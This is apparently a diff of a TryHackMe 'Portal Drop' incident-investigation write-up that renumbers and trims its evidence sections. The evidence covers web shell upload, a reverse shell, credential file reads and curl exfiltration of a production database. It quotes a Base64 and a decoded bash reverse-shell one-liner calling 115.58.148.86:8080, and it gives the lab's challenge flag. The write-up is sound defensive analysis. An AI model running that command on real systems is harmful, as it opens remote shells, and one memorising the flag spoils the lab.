@@ -60,45 +60,29 @@ TryHackMe Portal Drop investigation completion dashboard confirming all investig
 TryDetectMe XDR Activity Dashboard displaying the 4 correlated security alerts across `TPMHQ-CRM01` and `TMPEU-UATSERVER`:
 ![EDR Alert Queue Dashboard](screenshots/02-edr-alert-queue-dashboard.png)
 
-#### Evidence 3: Splunk Access Logs – Credential Stuffing & Brute Force
-Pre-compromise reconnaissance telemetry captured in Splunk `access_combined` logs, exposing high-frequency POST requests to `/CRM/login.php` resulting in 401 response spikes:
-![Splunk Access Logs Brute Force](screenshots/03-splunk-access-logs-brute-force.png)
-
-#### Evidence 4: Web Shell Drop & Execution Telemetry
+#### Evidence 3: Web Shell Drop & Execution Telemetry in Splunk
 Splunk search capturing attacker IP `34.67.91[.]83` leveraging `python-requests/2.31.0` to upload `invoice.php` via `upload.php` and invoke execution commands:
-![Splunk Web Shell Upload](screenshots/04-splunk-access-logs-webshell-upload.png)
+![Splunk Web Shell Upload](screenshots/03-splunk-access-logs-webshell-upload.png)
 
-#### Evidence 5: Ingress Payload De-Obfuscation via Decodora (`whoami`)
-The initial obfuscated parameter `d2hvYW1p` passed to `invoice.php` was decoded offline using **[Decodora](https://mahialjaber.github.io/Decodora/)**, revealing the initial reconnaissance command `whoami`:
-![Decodora Decoded whoami](screenshots/05-decodora-decoded-whoami.png)
+#### Evidence 4: Reverse Shell Stager De-Obfuscation via Decodora (Custom Analyst Tool)
+Decoding the Base64 payload `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTUuNTguMTQ4Ljg2LzgwODAgMD4mMQ==` offline using **[Decodora](https://mahialjaber.github.io/Decodora/)**, exposing the active interactive reverse shell payload targeting `115.58.148[.]86:8080`:
+![Decodora Decoded Reverse Shell](screenshots/04-decodora-decoded-reverse-shell.png)
 
-#### Evidence 6: Reverse Shell Stager De-Obfuscation via Decodora
-Decoding the secondary Base64 payload `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTUuNTguMTQ4Ljg2LzgwODAgMD4mMQ==` via **[Decodora](https://mahialjaber.github.io/Decodora/)**, exposing the active interactive reverse shell payload:
-![Decodora Decoded Reverse Shell](screenshots/06-decodora-decoded-reverse-shell.png)
-
-#### Evidence 7: EDR Parent-Child Anomaly – Interactive Shell Spawn
+#### Evidence 5: EDR Parent-Child Anomaly – Interactive Shell Spawn
 TryDetectMe XDR alert capturing the illegal execution lineage where `/usr/sbin/php-fpm7.4` spawned `/bin/bash` with argument `-c "bash -i >& /dev/tcp/115.58.148.86/8080 0>&1"`:
-![EDR Shell Spawn Reverse Shell](screenshots/07-edr-shell-spawn-reverse-shell.png)
+![EDR Shell Spawn Reverse Shell](screenshots/05-edr-shell-spawn-reverse-shell.png)
 
-#### Evidence 8: VirusTotal Threat Intelligence on Reverse Shell Listener
+#### Evidence 6: VirusTotal Threat Intelligence on Reverse Shell Listener
 CTI enrichment for `115.58.148[.]86` confirming multiple security vendors flagging the host as malicious malware infrastructure originating from China Unicom Backbone:
-![VirusTotal C2 Reputation](screenshots/08-virustotal-c2-reputation.png)
+![VirusTotal C2 Reputation](screenshots/06-virustotal-c2-reputation.png)
 
-#### Evidence 9: Sensitive Credential Access via File Enumeration
-TryDetectMe XDR process timeline recording non-interactive command execution by `www-data`, targeting `/etc/trycrm/config.json` via `/bin/cat` (PID `1216`):
-![EDR Sensitive File Read](screenshots/09-edr-system-discovery-config-read.png)
-
-#### Evidence 10: Production Database Exfiltration via `curl`
+#### Evidence 7: Production Database Exfiltration via curl
 Process and network telemetry capturing the unauthorized outbound upload of `/var/lib/trycrm/prod.db` and `/var/lib/trycrm/prod.idx` to staging domain `portaldrop2025[.]xyz`:
-![EDR Data Exfiltration via curl](screenshots/10-edr-data-exfiltration-curl.png)
+![EDR Data Exfiltration via curl](screenshots/07-edr-data-exfiltration-curl.png)
 
-#### Evidence 11: Tactical Containment & Remediation Actions
-Verification of successful incident response execution in TryDetectMe XDR: Host isolation, domain/IP perimeter blocking, and root cause analysis:
-![EDR Containment Actions Completed](screenshots/11-edr-containment-actions-completed.png)
-
-#### Evidence 12: Web Shell Quarantine & Challenge Flag Capture
+#### Evidence 8: Web Shell Quarantine & Challenge Flag Capture
 Remediation confirmation showing file collection and quarantine of `/var/www/html/CRM/portal/uploads/invoice.php`, rewarding challenge flag `THM{p0rtal_dropp3d?}`:
-![EDR Flag Capture Remediation](screenshots/12-edr-flag-capture-remediation.png)
+![EDR Flag Capture Remediation](screenshots/08-edr-flag-capture-remediation.png)
 
 ---
 
